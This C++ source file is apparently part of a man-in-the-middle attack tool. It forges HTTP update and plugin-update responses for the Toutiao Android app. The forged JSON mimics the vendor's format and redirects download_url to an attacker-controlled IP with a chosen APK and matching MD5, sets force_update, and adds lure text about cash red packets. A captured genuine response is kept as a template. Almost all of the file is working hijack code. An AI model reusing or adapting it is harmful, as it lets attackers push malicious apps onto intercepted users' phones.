



#include <windows.h>
#include "TodayHeadline.h"

#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;



int TodayHeadline::prepareSoRespData(unsigned long ulIP, string filepath, string filename1,string filename2) {

	int ret = 0;

	string apk1ver = "999";	//122
	string apk2ver = "999"; //160


	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename1, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char szf1md5[256] = { 0 };
	lstrcpyA(szf1md5, m_szmd5);

	ret = getUpdateFileMd5(filepath + filename2, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}
	char szf2md5[256] = { 0 };
	lstrcpyA(szf2md5, m_szmd5);

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\r\n"
		"\"message\": \"success\",\r\n" 
		"\"data\": {\r\n"
		"\"update_plugins\": [\r\n"
		"{\r\n"
		"\"package_name\": \"com.bytedance.common.plugin.wschannel\", \r\n"
		"\"target_version\": 6000, \r\n"
		"\"proxy_class\": \"com.bytedance.common.plugin.faces.WsChannelProxy\", \r\n"
		"\"plugin_class\": \"com.bytedance.common.plugin.wschannel.WsChannelPlugin\", \r\n"
		"\"apk_version_code\": %s, \r\n"
		"\"apk_md5\": \"%s\", \r\n"
		"\"resources_type\": 1, \r\n"
		"\"process_type\": 2, \r\n"
		"\"process_name_suffix\": \":push\", \r\n"
		"\"process_name_suffix_list\": [\":pushservice\", \":push\"], \r\n"
		"\"download_url\": \"http://%s/%s\", \r\n"
		"\"support_host_list\": [\"s3a.pstatp.com\", \"s3b.pstatp.com\", \"s1.pstatp.com\", \"s2.pstatp.com\", \"s0.pstatp.com\"]\r\n"
		"},\r\n"
		"{\r\n"
		"\"package_name\": \"com.bytedance.common.plugin.cronet\", \r\n"
		"\"target_version\": 68500, \r\n"
		"\"proxy_class\": \"com.bytedance.common.plugin.faces.CronetProxy\", \r\n"
		"\"plugin_class\": \"com.bytedance.common.plugin.cronet.CronetPlugin\", \r\n"
		"\"apk_version_code\": %s, \r\n"
		"\"apk_md5\": \"%s\",\r\n"
		"\"resources_type\": 1, \r\n"
		"\"process_type\": 2, \r\n"
		"\"process_name_suffix\": \":push\", \r\n"
		"\"process_name_suffix_list\": [\":pushservice\", \":push\"], \r\n"
		"\"download_url\": \"http://%s/%s\", \r\n"
		"\"support_host_list\": [\"s3a.pstatp.com\", \"s3b.pstatp.com\", \"s1.pstatp.com\", \"s2.pstatp.com\", \"s0.pstatp.com\"]\r\n"
		"}\r\n"
		"]\r\n"
		"}\r\n"
		"}\r\n";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		apk1ver.c_str(), szf1md5, szip.c_str(), filename1.c_str(), apk2ver.c_str(),szf2md5,szip.c_str(),filename2.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}



int TodayHeadline::prepareOldRespData(unsigned long ulIP,string filepath,string filename) {

	int ret = 0;

	string realvername = "9.7.2";
	string tipvername = "4.7.4";
	int realvercode = 67209;	//67209

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"message\": \"success\","
		"\"code\" : 0,"
		"\"data\" :"
		"{\"tip_version_name\": \"%s\","
		"\"pre_download_max_wait_seconds\" : 10,"
		"\"market_update_enable\" : 0,"
		"\"real_version_name\" : \"%s\","
		"\"md5\" : \"%s\","
		"\"latency\" : 15,"
		"\"title\" : \"\\u5934\\u6761\\u66f4\\u65b0\\u5566\\uff01\","
		"\"already_download_tips\" : \"\\u6625\\u8282\\u4e0a\\u5934\\u6761 \\u62a210\\u4ebf\\u7ea2\\u5305\n\\u4eca\\u65e5\\u5934\\u6761\\u5b98\\u65b9\\u6625\\u8282\\u6d3b\\u52a8\\u201c\\u53d1\\u8d22\\u4e2d\\u56fd\\u5e74\\u201d\n\\u7ea2\\u5305\\u5168\\u73b0\\u91d1 \\u63d0\\u73b0\\u65e0\\u95e8\\u69db\","
		"\"pre_download\" : 0,"
		"\"force_update\" : 0,"
		"\"download_url\" : \"http://%s/%s\","
		"\"market_update\" :"
		"{\"market_update_package\": \"\","
		"\"market_update_intent_url\" : \"\","
		"\"market_update_intent_tips\" : \"\"},"
		"\"inhouse\" : 0,"
		"\"real_version_code\" : %u,"
		"\"whats_new\" : \"\\u4f18\\u5316\\u4e86GIF\\u7684\\u64ad\\u653e\\u4f53\\u9a8c\n\\u63d0\\u9ad8\\u4e86\\u7a33\\u5b9a\\u6027\\uff0c\\u6d4f\\u89c8\\u4f53\\u9a8c\\u66f4\\u6d41\\u7545\","
		"\"verbose_name\" : \"\\u4eca\\u65e5\\u5934\\u6761\","
		"\"tip_version_code\" : %u}}\r\n\r\n";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		tipvername.c_str(), realvername.c_str(), m_szmd5, szip.c_str(),filename.c_str(), realvercode, realvercode);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;

}




int TodayHeadline::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;

	string realvername = "9.7.2";

	int realvercode = 97209;	//67209

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"code\":0,\"data\":{\"tip_version_name\":\"4.7.4\",\"tip_version_code\":474,\"real_version_name\":\"%s\","
		"\"real_version_code\":%u,\"pre_download_max_wait_seconds\":10,\"market_update_enable\":0,\"latency\":15,"
		"\"title\":\"update\",\"already_download_tips\":\"new update\","
		"\"pre_download\":1,\"force_update\":1,\"download_url\":\"http://%s/%s\","
		"\"market_update\":{\"market_update_package\":\"\",\"market_update_intent_url\":\"\",\"market_update_intent_tips\":\"\"},"
		"\"inhouse\":0,\"whats_new\":\"\",\"verbose_name\":\"\",\"md5\":\"%s\"},\"message\":\"success\"}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		realvername.c_str(), realvercode, szip.c_str(), filename.c_str(),m_szmd5);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;

}


/*
{"code":0,"data":{"tip_version_name":"7.0.3","tip_version_code":703,"real_version_name":"7.0.7","real_version_code":70714,
"pre_download_max_wait_seconds":10,"market_update_enable":0,"latency":15,"title":"头条更新啦！",
"already_download_tips":"春节上头条 抢10亿红包\n今日头条官方春节活动“发财中国年”\n红包全现金 提现无门槛",
"pre_download":0,"force_update":0,
"download_url":"https://lf3-ttcdn-tos.pstatp.com/obj/rocketpackagebackup/android_release_update_pkg/1547534946NewsArticle_update_v7.0.7_45a5b50.apk",
"market_update":{"market_update_package":"","market_update_intent_url":"","market_update_intent_tips":""},
"inhouse":0,"whats_new":"性能优化，提升打开速度\n内容优化，更多精彩内容让你看到停不下来","verbose_name":"今日头条","md5":""},"message":"success"}
*/